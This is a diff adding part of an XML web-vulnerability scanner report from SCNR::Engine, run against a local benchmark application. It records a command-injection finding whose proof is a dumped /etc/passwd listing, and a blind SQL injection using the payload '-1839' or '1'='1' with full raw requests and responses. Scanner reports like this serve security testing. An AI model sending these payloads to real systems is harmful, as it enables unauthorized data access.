+                        autocomplete="off"&gt;
+                        &lt;div&gt;
+                        &lt;label&gt;Please enter your details:&lt;/label&gt;
+                        &lt;/div&gt;
+                        &lt;br&gt;
+                        &lt;div&gt;
+                        &lt;label&gt;Username:&lt;/label&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                        &lt;input type="text" id="username" name="username"&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                        &lt;label&gt;Password:&lt;/label&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                        &lt;input type="text" id="password" name="password" value=""&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;&amp;nbsp;&lt;/div&gt;
+                        &lt;div&gt;
+                        &lt;label&gt;Parameter: BenchmarkTest00001 &lt;br&gt;Value:
+                        &lt;/label&gt; &lt;input type="text" id="BenchmarkTest00001" name="BenchmarkTest00001" value="."&gt;
+                        &lt;/div&gt;
+                        &lt;br&gt;
+                        &lt;div&gt;
+                        &lt;input type="submit" value="Login"&gt;
+                        &lt;/div&gt;
+                        &lt;/form&gt;
+                        &lt;/body&gt;
+                        &lt;/html&gt; </body>
+                    <raw_headers>HTTP/1.1 200 &#xD;
+                        Content-Security-Policy: frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline'
+                        'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self'
+                        fonts.googleapis.com; font-src 'self' fonts.gstatic.com&#xD;
+                        Cache-Control: no-cache, no-store, must-revalidate&#xD;
+                        Strict-Transport-Security: max-age=31536000;includeSubDomains&#xD;
+                        X-Frame-Options: DENY&#xD;
+                        X-Content-Type-Options: nosniff&#xD;
+                        Accept-Ranges: bytes&#xD;
+                        ETag: W/"1279-1704958566000"&#xD;
+                        Last-Modified: Thu, 01 Jan 2024 07:36:06 GMT&#xD;
+                        Content-Type: text/html;charset=UTF-8&#xD;
+                        Content-Length: 1279&#xD;
+                        Date: Sat, 13 Jan 2024 03:50:54 GMT&#xD;
+                        &#xD; </raw_headers>
+                </response>
+                <dom>
+                    <url>https://localhost:8443/benchmark/cmdi-03/BenchmarkTest00001.html?BenchmarkTest00001=SafeText
+                    </url>
+                    <transitions />
+                    <data_flow_sinks />
+                    <execution_flow_sinks />
+                </dom>
+            </referring_page>
+            <signature>&amp;#x3a;.+&amp;#x3a;\d+&amp;#x3a;\d+&amp;#x3a;.+&amp;#x3a;[0-9a-zA-Z&amp;#;]+</signature>
+            <proof>&amp;#x3a;x&amp;#x3a;0&amp;#x3a;0&amp;#x3a;root&amp;#x3a;&amp;#x2f;root&amp;#x3a;&amp;#x2f;bin&amp;#x2f;bash&lt;br&gt;daemon&amp;#x3a;x&amp;#x3a;1&amp;#x3a;1&amp;#x3a;daemon&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;bin&amp;#x3a;x&amp;#x3a;2&amp;#x3a;2&amp;#x3a;bin&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;sys&amp;#x3a;x&amp;#x3a;3&amp;#x3a;3&amp;#x3a;sys&amp;#x3a;&amp;#x2f;dev&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;sync&amp;#x3a;x&amp;#x3a;4&amp;#x3a;65534&amp;#x3a;sync&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;bin&amp;#x2f;sync&lt;br&gt;games&amp;#x3a;x&amp;#x3a;5&amp;#x3a;60&amp;#x3a;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;man&amp;#x3a;x&amp;#x3a;6&amp;#x3a;12&amp;#x3a;man&amp;#x3a;&amp;#x2f;var&amp;#x2f;cache&amp;#x2f;man&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;lp&amp;#x3a;x&amp;#x3a;7&amp;#x3a;7&amp;#x3a;lp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;lpd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;mail&amp;#x3a;x&amp;#x3a;8&amp;#x3a;8&amp;#x3a;mail&amp;#x3a;&amp;#x2f;var&amp;#x2f;mail&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;news&amp;#x3a;x&amp;#x3a;9&amp;#x3a;9&amp;#x3a;news&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;news&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;uucp&amp;#x3a;x&amp;#x3a;10&amp;#x3a;10&amp;#x3a;uucp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;uucp&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;proxy&amp;#x3a;x&amp;#x3a;13&amp;#x3a;13&amp;#x3a;proxy&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;www-data&amp;#x3a;x&amp;#x3a;33&amp;#x3a;33&amp;#x3a;www-data&amp;#x3a;&amp;#x2f;var&amp;#x2f;www&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;backup&amp;#x3a;x&amp;#x3a;34&amp;#x3a;34&amp;#x3a;backup&amp;#x3a;&amp;#x2f;var&amp;#x2f;backups&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;list&amp;#x3a;x&amp;#x3a;38&amp;#x3a;38&amp;#x3a;Mailing
+                List Manager&amp;#x3a;&amp;#x2f;var&amp;#x2f;list&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;irc&amp;#x3a;x&amp;#x3a;39&amp;#x3a;39&amp;#x3a;ircd&amp;#x3a;&amp;#x2f;run&amp;#x2f;ircd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;gnats&amp;#x3a;x&amp;#x3a;41&amp;#x3a;41&amp;#x3a;Gnats
+                Bug-Reporting System &amp;#x28;admin&amp;#x29;&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;gnats&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;nobody&amp;#x3a;x&amp;#x3a;65534&amp;#x3a;65534&amp;#x3a;nobody&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;_apt&amp;#x3a;x&amp;#x3a;100&amp;#x3a;65534&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-network&amp;#x3a;x&amp;#x3a;101&amp;#x3a;102&amp;#x3a;systemd
+                Network
+                Management,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-resolve&amp;#x3a;x&amp;#x3a;102&amp;#x3a;103&amp;#x3a;systemd
+                Resolver,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;messagebus&amp;#x3a;x&amp;#x3a;103&amp;#x3a;104&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-timesync&amp;#x3a;x&amp;#x3a;104&amp;#x3a;105&amp;#x3a;systemd
+                Time Synchronization,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;bench&amp;#x3a;x&amp;#x3a;1000&amp;#x3a;1000&amp;#x3a;&amp;#x3a;&amp;#x2f;home&amp;#x2f;bench&amp;#x3a;&amp;#x2f;bin&amp;#x2f;bash
+            </proof>
+            <trusted>true</trusted>
+            <platform_type>os</platform_type>
+            <platform_name>unix</platform_name>
+        </issue>
+        <issue>
+            <name>Blind SQL Injection (differential analysis)</name>
+            <description>
+                Due to the requirement for dynamic content of today's web applications, many
+                rely on a database backend to store data that will be called upon and processed
+                by the web application (or other programs).
+                Web applications retrieve data from the database by using Structured Query Language
+                (SQL) queries.
+
+                To meet demands of many developers, database servers (such as MSSQL, MySQL,
+                Oracle etc.) have additional built-in functionality that can allow extensive
+                control of the database and interaction with the host operating system itself.
+
+                An SQL injection occurs when a value originating from the client's request is used
+                within a SQL query without prior sanitisation. This could allow cyber-criminals
+                to execute arbitrary SQL code and steal data or use the additional functionality
+                of the database server to take control of more server components.
+
+                The successful exploitation of a SQL injection can be devastating to an
+                organisation and is one of the most commonly exploited web application
+                vulnerabilities.
+
+                This injection was detected as SCNR::Engine was able to inject specific SQL queries,
+                that if vulnerable, result in the responses for each injection being different.
+                This is known as a blind SQL injection vulnerability.
+            </description>
+            <remedy_guidance>
+                The only proven method to prevent against SQL injection attacks while still
+                maintaining full application functionality is to use parameterized queries
+                (also known as prepared statements).
+                When utilising this method of querying the database, any value supplied by the
+                client will be handled as a string value rather than part of the SQL query.
+
+                Additionally, when utilising parameterized queries, the database engine will
+                automatically check to make sure the string being used matches that of the column.
+                For example, the database engine will check that the user supplied input is an
+                integer if the database column is configured to contain integers.
+            </remedy_guidance>
+            <remedy_code />
+            <severity>high</severity>
+            <check>
+                <name>Blind SQL Injection (differential analysis)</name>
+                <description>
+                    It uses differential analysis to determine how different inputs affect behavior
+                    of the web application and checks if the displayed behavior is consistent with
+                    that of a vulnerable application.
+                </description>
+                <author>Tasos "Zapotek" Laskos &lt;tasos.laskos@gmail.com&gt;</author>
+                <version>0.4.5</version>
+                <shortname>sql_injection_differential</shortname>
+            </check>
+            <cwe>89</cwe>
+            <digest>3042692549</digest>
+            <references>
+                <reference title="OWASP" url="https://www.owasp.org/index.php/Blind_SQL_Injection" />
+                <reference title="MITRE - CAPEC" url="http://capec.mitre.org/data/definitions/7.html" />
+                <reference title="WASC" url="http://projects.webappsec.org/w/page/13246963/SQL%20Injection" />
+                <reference title="W3 Schools" url="http://www.w3schools.com/sql/sql_injection.asp" />
+            </references>
+            <vector>
+                <class>SCNR::Engine::Element::Form</class>
+                <type>form</type>
+                <url>https://localhost:8443/benchmark/xpathi-00/BenchmarkTest00002.html?BenchmarkTest00002=SafeText
+                </url>
+                <action>https://localhost:8443/benchmark/xpathi-00/BenchmarkTest00002</action>
+                <source>&lt;form action="/benchmark/xpathi-00/BenchmarkTest00002" method="POST"
+                    id="FormBenchmarkTest00002" autocomplete="off"&gt;
+                    &lt;div&gt;
+                    &lt;label&gt;
+                    &lt;/label&gt;
+                    &lt;/div&gt;
+                    &lt;br /&gt;
+                    &lt;div&gt;
+                    &lt;label&gt;
+                    &lt;/label&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;input type="text" id="email" name="email" /&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;label&gt;
+                    &lt;/label&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;input type="text" id="password" name="password" value="" /&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;label&gt;
+                    &lt;br /&gt;
+                    &lt;/label&gt;
+                    &lt;input type="text" id="BenchmarkTest00002" name="BenchmarkTest00002" value="2222" /&gt;
+                    &lt;/div&gt;
+                    &lt;br /&gt;
+                    &lt;div&gt;
+                    &lt;input type="submit" value="Login" /&gt;
+                    &lt;/div&gt;
+                    &lt;/form&gt; </source>
+                <seed>-1839' or '1'='1</seed>
+                <method>post</method>
+                <affected_input_name>BenchmarkTest00002</affected_input_name>
+                <inputs>
+                    <input name="email" value="scnr_engine@email.gr" />
+                    <input name="password" value="5543!%scnr_engine_secret" />
+                    <input name="BenchmarkTest00002" value="-1839' or '1'='1" />
+                </inputs>
+                <default_inputs>
+                    <input name="email" value="" />
+                    <input name="password" value="" />
+                    <input name="BenchmarkTest00002" value="2222" />
+                </default_inputs>
+            </vector>
+            <remarks>
+                <remark>
+                    <commenter>differential_analysis</commenter>
+                    <text>True expression: -1839' or '1'='1</text>
+                </remark>
+                <remark>
+                    <commenter>differential_analysis</commenter>
+                    <text>False expression: -1839' or '1'='2</text>
+                </remark>
+                <remark>
+                    <commenter>differential_analysis</commenter>
+                    <text>Control false expression: -1839</text>
+                </remark>
+            </remarks>
+            <page>
+                <body>Your query results are: &lt;br/&gt;
+
+                    John
+                    Watson
+                    30
+                    johnwatson@sh.com
+                    &lt;br/&gt;
+
+                    Sherlock
+                    Homes
+                    32
+                    sherlock@sh.com
+                    &lt;br/&gt;
+
+                    Jim
+                    Moriarty
+                    52
+                    jim@sh.com
+                    &lt;br/&gt;
+
+                    Mycroft
+                    Holmes
+                    41
+                    mycroft@sh.com
+                    &lt;br/&gt; </body>
+                <request>
+                    <url>https://localhost:8443/benchmark/xpathi-00/BenchmarkTest00002</url>
+                    <method>post</method>
+                    <parameters />
+                    <headers>
+                        <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" />
+                        <header name="User-Agent" value="Mozilla/5.0 (Gecko) SCNR::Engine/v1.0dev" />
+                        <header name="Accept-Language" value="en-US,en;q=0.8,he;q=0.6" />
+                        <header name="X-Scnr-Engine-Scan-Seed" value="c38472c392d2618a025032a4392379de" />
+                        <header name="X-Scnr-Introspector-Taint" value="c38472c392d2618a025032a4392379de" />
+                        <header name="X-Scnr-Introspector-Trace" value="28811" />
+                    </headers>
+                    <body>email=scnr_engine%40email.gr&amp;password=5543%21%25scnr_engine_secret&amp;BenchmarkTest00002=-1839%27%20or%20%271%27%3D%271</body>
+                    <raw>POST /benchmark/xpathi-00/BenchmarkTest00002 HTTP/1.1&#xD;
+                        Host: localhost:8443&#xD;
+                        Accept-Encoding: gzip, deflate&#xD;
+                        User-Agent: Mozilla/5.0 (Gecko) SCNR::Engine/v1.0dev&#xD;
+                        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#xD;
+                        Accept-Language: en-US,en;q=0.8,he;q=0.6&#xD;
+                        X-Scnr-Engine-Scan-Seed: c38472c392d2618a025032a4392379de&#xD;
+                        X-Scnr-Introspector-Taint: c38472c392d2618a025032a4392379de&#xD;
+                        X-Scnr-Introspector-Trace: 28811&#xD;
+                        Content-Length: 116&#xD;
+                        Content-Type: application/x-www-form-urlencoded&#xD;
+                        &#xD;
+                        email=scnr_engine%40email.gr&amp;password=5543%21%25scnr_engine_secret&amp;BenchmarkTest00002=-1839%27%20or%20%271%27%3D%271
+                    </raw>
+                </request>
+                <response>
+                    <url>https://localhost:8443/benchmark/xpathi-00/BenchmarkTest00002</url>
+                    <code>200</code>
+                    <ip_address>127.0.0.1</ip_address>
+                    <time>0.0271</time>
+                    <return_code>ok</return_code>
+                    <return_message>No error</return_message>
+                    <headers>
+                        <header name="Content-Security-Policy" value="frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com" />
+                        <header name="Cache-Control" value="no-cache, no-store, must-revalidate" />
+                        <header name="Strict-Transport-Security" value="max-age=31536000;includeSubDomains" />
+                        <header name="X-Frame-Options" value="DENY" />
+                        <header name="X-Content-Type-Options" value="nosniff" />
+                        <header name="Content-Type" value="text/html;charset=UTF-8" />
+                        <header name="Content-Length" value="329" />
+                        <header name="Date" value="Mon, 15 Jan 2024 07:51:06 GMT" />
+                    </headers>
+                    <body>Your query results are: &lt;br/&gt;
+
+                        John
+                        Watson
+                        30
+                        johnwatson@sh.com
+                        &lt;br/&gt;
+
+                        Sherlock
+                        Homes
+                        32
+                        sherlock@sh.com
+                        &lt;br/&gt;
+
+                        Jim
+                        Moriarty
+                        52
+                        jim@sh.com
+                        &lt;br/&gt;
+
+                        Mycroft
+                        Holmes
+                        41
+                        mycroft@sh.com
+                        &lt;br/&gt; </body>
+                    <raw_headers>HTTP/1.1 200 &#xD;
+                        Content-Security-Policy: frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline'
+                        'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self'
+                        fonts.googleapis.com; font-src 'self' fonts.gstatic.com&#xD;
+                        Cache-Control: no-cache, no-store, must-revalidate&#xD;
+                        Strict-Transport-Security: max-age=31536000;includeSubDomains&#xD;
+                        X-Frame-Options: DENY&#xD;
+                        X-Content-Type-Options: nosniff&#xD;
+                        Content-Type: text/html;charset=UTF-8&#xD;
+                        Content-Length: 329&#xD;
+                        Date: Mon, 15 Jan 2024 07:51:06 GMT&#xD;
+                        &#xD; </raw_headers>
+                </response>
+                <dom>
+                    <url>https://localhost:8443/benchmark/xpathi-00/BenchmarkTest00002</url>
+                    <transitions />
+                    <data_flow_sinks />
+                    <execution_flow_sinks />
+                </dom>
+            </page>
+            <referring_page>
+                <body>&lt;!DOCTYPE html&gt;
+                    &lt;html lang="en-US"&gt;
+                    &lt;head&gt;
+                    &lt;meta charset="utf-8"&gt;
+                    &lt;script src="/benchmark/js/jquery.min.js" type="text/javascript"&gt;&lt;/script&gt;
+                    &lt;script type="text/javascript" src="/benchmark/js/js.cookie.js"&gt;&lt;/script&gt;
+                    &lt;script src="/benchmark/js/testsuiteutils.js" type="text/javascript"&gt;&lt;/script&gt;
+                    &lt;link rel="icon" type="image/png" href="/benchmark/favicon.ico"&gt;
+                    &lt;title&gt;BenchmarkTest00002&lt;/title&gt;
+                    &lt;/head&gt;
+                    &lt;body&gt;
+                    &lt;form action="/benchmark/xpathi-00/BenchmarkTest00002" method="POST" id="FormBenchmarkTest00002"
+                    autocomplete="off"&gt;
+                    &lt;div&gt;
+                    &lt;label&gt;Please enter your details:&lt;/label&gt;
+                    &lt;/div&gt;
+                    &lt;br&gt;
+                    &lt;div&gt;
+                    &lt;label&gt;Email:&lt;/label&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;input type="text" id="email" name="email"&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;label&gt;Password:&lt;/label&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;input type="text" id="password" name="password" value=""&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;&amp;nbsp;&lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;label&gt;Parameter: BenchmarkTest00002 &lt;br&gt;Value:
+                    &lt;/label&gt; &lt;input type="text" id="BenchmarkTest00002" name="BenchmarkTest00002" value="2222"&gt;
+                    &lt;/div&gt;
+                    &lt;br&gt;
+                    &lt;div&gt;
+                    &lt;input type="submit" value="Login"&gt;
+                    &lt;/div&gt;
+                    &lt;/form&gt;
+                    &lt;/body&gt;
+                    &lt;/html&gt; </body>
+                <request>
+                    <url>
+                        https://localhost:8443/benchmark/xpathi-00/BenchmarkTest00002.html?BenchmarkTest00002=SafeText
+                    </url>
+                    <method>get</method>
+                    <parameters />
+                    <headers>
+                        <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" />
+                        <header name="User-Agent" value="Mozilla/5.0 (Gecko) SCNR::Engine/v1.0dev" />
+                        <header name="Accept-Language" value="en-US,en;q=0.8,he;q=0.6" />
+                        <header name="X-Scnr-Engine-Scan-Seed" value="c38472c392d2618a025032a4392379de" />
+                        <header name="X-Scnr-Introspector-Taint" value="c38472c392d2618a025032a4392379de" />
+                        <header name="X-Scnr-Introspector-Trace" value="25786" />
+                    </headers>
+                    <body />
+                    <raw>GET /benchmark/xpathi-00/BenchmarkTest00002.html?BenchmarkTest00002=SafeText HTTP/1.1&#xD;
+                        Host: localhost:8443&#xD;
+                        Accept-Encoding: gzip, deflate&#xD;
+                        User-Agent: Mozilla/5.0 (Gecko) SCNR::Engine/v1.0dev&#xD;
+                        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#xD;
+                        Accept-Language: en-US,en;q=0.8,he;q=0.6&#xD;
+                        X-Scnr-Engine-Scan-Seed: c38472c392d2618a025032a4392379de&#xD;
+                        X-Scnr-Introspector-Taint: c38472c392d2618a025032a4392379de&#xD;
+                        X-Scnr-Introspector-Trace: 25786&#xD;
+                        &#xD; </raw>
+                </request>
+                <response>
+                    <url>
+                        https://localhost:8443/benchmark/xpathi-00/BenchmarkTest00002.html?BenchmarkTest00002=SafeText
+                    </url>
+                    <code>200</code>
+                    <ip_address>127.0.0.1</ip_address>
+                    <time>0.0028</time>
+                    <return_code>ok</return_code>
+                    <return_message>No error</return_message>
+                    <headers>
+                        <header name="Content-Security-Policy" value="frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com" />
+                        <header name="Cache-Control" value="no-cache, no-store, must-revalidate" />
+                        <header name="Strict-Transport-Security" value="max-age=31536000;includeSubDomains" />
+                        <header name="X-Frame-Options" value="DENY" />
+                        <header name="X-Content-Type-Options" value="nosniff" />
+                        <header name="Accept-Ranges" value="bytes" />
+                        <header name="Etag" value="W/&quot;1276-1704958566000&quot;" />
+                        <header name="Last-Modified" value="Thu, 01 Jan 2024 07:36:06 GMT" />
+                        <header name="Content-Type" value="text/html;charset=UTF-8" />
+                        <header name="Content-Length" value="1276" />
+                        <header name="Date" value="Mon, 15 Jan 2024 07:50:55 GMT" />
+                    </headers>
+                    <body>&lt;!DOCTYPE html&gt;
+                        &lt;html lang="en-US"&gt;
+                        &lt;head&gt;
+                        &lt;meta charset="utf-8"&gt;
+                        &lt;script src="/benchmark/js/jquery.min.js" type="text/javascript"&gt;&lt;/script&gt;
+                        &lt;script type="text/javascript" src="/benchmark/js/js.cookie.js"&gt;&lt;/script&gt;
+                        &lt;script src="/benchmark/js/testsuiteutils.js" type="text/javascript"&gt;&lt;/script&gt;
+                        &lt;link rel="icon" type="image/png" href="/benchmark/favicon.ico"&gt;
+                        &lt;title&gt;BenchmarkTest00002&lt;/title&gt;
+                        &lt;/head&gt;
+                        &lt;body&gt;
+                        &lt;form action="/benchmark/xpathi-00/BenchmarkTest00002" method="POST"
+                        id="FormBenchmarkTest00002" autocomplete="off"&gt;
+                        &lt;div&gt;
+                        &lt;label&gt;Please enter your details:&lt;/label&gt;
+                        &lt;/div&gt;
+                        &lt;br&gt;
+                        &lt;div&gt;
+                        &lt;label&gt;Email:&lt;/label&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                        &lt;input type="text" id="email" name="email"&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                        &lt;label&gt;Password:&lt;/label&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                        &lt;input type="text" id="password" name="password" value=""&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;&amp;nbsp;&lt;/div&gt;
+                        &lt;div&gt;
+                        &lt;label&gt;Parameter: BenchmarkTest00002 &lt;br&gt;Value:
+                        &lt;/label&gt; &lt;input type="text" id="BenchmarkTest00002" name="BenchmarkTest00002"
+                        value="2222"&gt;
+                        &lt;/div&gt;
+                        &lt;br&gt;
+                        &lt;div&gt;
+                        &lt;input type="submit" value="Login"&gt;
+                        &lt;/div&gt;
+                        &lt;/form&gt;
+                        &lt;/body&gt;
+                        &lt;/html&gt; </body>
+                    <raw_headers>HTTP/1.1 200 &#xD;
+                        Content-Security-Policy: frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline'
+                        'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self'
+                        fonts.googleapis.com; font-src 'self' fonts.gstatic.com&#xD;
+                        Cache-Control: no-cache, no-store, must-revalidate&#xD;
+                        Strict-Transport-Security: max-age=31536000;includeSubDomains&#xD;
+                        X-Frame-Options: DENY&#xD;
+                        X-Content-Type-Options: nosniff&#xD;
+                        Accept-Ranges: bytes&#xD;
+                        ETag: W/"1276-1704958566000"&#xD;
+                        Last-Modified: Thu, 01 Jan 2024 07:36:06 GMT&#xD;
+                        Content-Type: text/html;charset=UTF-8&#xD;
+                        Content-Length: 1276&#xD;
+                        Date: Mon, 15 Jan 2024 07:50:55 GMT&#xD;
+                        &#xD; </raw_headers>
+                </response>
+                <dom>
+                    <url>
+                        https://localhost:8443/benchmark/xpathi-00/BenchmarkTest00002.html?BenchmarkTest00002=SafeText
+                    </url>
+                    <transitions />
+                    <data_flow_sinks />
+                    <execution_flow_sinks />
+                </dom>
+            </referring_page>
+            <signature />
+            <proof />
+            <trusted>true</trusted>
+            <platform_type />
+            <platform_name />
+        </issue>
+    </issues>
+</report>
